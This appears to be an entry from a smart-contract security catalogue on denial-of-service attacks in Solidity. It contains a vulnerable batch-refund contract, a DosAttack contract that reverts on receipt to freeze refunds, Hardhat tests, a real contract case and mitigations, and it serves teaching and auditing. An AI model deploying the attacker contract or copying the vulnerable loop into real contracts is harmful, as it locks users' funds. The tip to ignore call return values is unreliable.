[back](../../README.md)
# Dos Attack

**name:** Dos Attack

**Severity:** Critical

**Description:** 

A DoS attack happens to a transaction which triggers multiple transfers, i.e. tokens or native crypto currencies are transferred to multiple addresses. After such a transaction is initiated from a smart contract, if any one of the transfers fails, the whole transaction will be reverted and all the other transfers will fail as well. In the worst case, the tokens or native crypto currencies would never be transferred to other addresses and would be locked in the smart contract permanently.  

DoS attacks can happen in various scenarios. For instance, in a blind auction application, one bidder’s transaction failure blocks all the other bidders’ participation in the auction. For more details please refer to: 
:https://docs.soliditylang.org/en/v0.8.7/solidity-by-example.html#blind-auction



**Language:** Solidity

**Code Sample:**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract DosDemo {
    mapping(address => uint) public user_amounts;
    mapping(address => bool) public user_is_deposited;
    address[] public all_users;
    bool public isEnd = false;

    function deposit() external payable {
        require(msg.value >0, "zero value");
        user_amounts[msg.sender] += msg.value;
        if(!user_is_deposited[msg.sender]) {
            user_is_deposited[msg.sender] = true;
            all_users.push(msg.sender);
        }
    }

    function payBack() external {
        // first check  state
        require(!isEnd," is end");
        // second change state
        isEnd = true;
        for(uint i=0;i<all_users.length;i++) {
            address payable user = payable(all_users[i]);
            uint value = user_amounts[user];
            user_amounts[user] = 0;
            // third transfer eth
            user.transfer(value);
        }
    }
}

contract DosAttack {
    function deposit(address target) external payable {
        require(msg.value >0, "zero value");
        DosDemo(target).deposit{value:msg.value}();
    }

    receive() external payable {
        revert("Good Bye");
    }
}
```




**Description of Code Sample:**

In the above code, a malicious actor firstly calls `DosAttack`’s `deposit` function, and then when the `payBack` function is called, ETHs will be sent to the attacking contract and the `receive` function will be called. However the receive function just reverts thus causing the whole transaction to fail. 



**Unit Test Code:**

```javascript
// SPDX-License-Identifier: GPL-3.0
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ReplayDemo Test", function () {
    let instance;
    let attack;
    let owner,user1,user2,users;

    beforeEach( async function() {
        let DosDemo = await ethers.getContractFactory("DosDemo");
        instance = await DosDemo.deploy();
        
        let DosAttack = await ethers.getContractFactory("DosAttack");
        attack = await DosAttack.deploy();
         
        [owner,user1,user2,...users] = await ethers.getSigners();
    });
    
    describe('ReplayDemo attack test', () => { 
        const value = ethers.utils.parseEther("1.0");

        it("PayBack should be successful while normal deposit", async () => {
            // check init balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(0);
            //deposit
            await instance.deposit({value});
            await instance.connect(user1).deposit({value});
            // check balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(value.mul(2));
            // payback
            await instance.payBack();
            // check balance again
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(0);
        });

        it("PayBack should be faild while be attacked", async () => {
            // check init balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(0);
            //deposit
            await instance.deposit({value});
            await attack.connect(user1).deposit(instance.address,{value});
            // check balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(value.mul(2));
            // payback
            await expect(instance.payBack()).to.be.revertedWith("Good Bye");
            // check balance again
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(value.mul(2));
        });
    });
});
```

**Real Case:**

The AkuAuction contract does not use the withdrawal mode, but uses the `processRefunds` function to return ether in batches.There is a denial of service risk here.

Contract address:https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code

**Recommendations:**

1. Consider following the Solidity team’s suggestion: requiring manually withdrawal of tokens or ETHs instead of sending tokens or ETHs.

2. If ETHs or tokens should be sent to multiple addresses, it is suggested to use an array to store all the addresses and the array is defined as an input parameter. In this case when a transfer to any one of the addresses fails, this failure can be skipped and the other transfers can proceed. In addition, using an array to handle this situation would reduce the possibility of “out-of-gas”.

3. A "call" function can be used to send ETHs or tokens to multiple addresses and handling of the return value can be omitted. But re-entrancy attacks should be tackled in this case.

4. Please consult with professional audit companies to conduct an audit.


   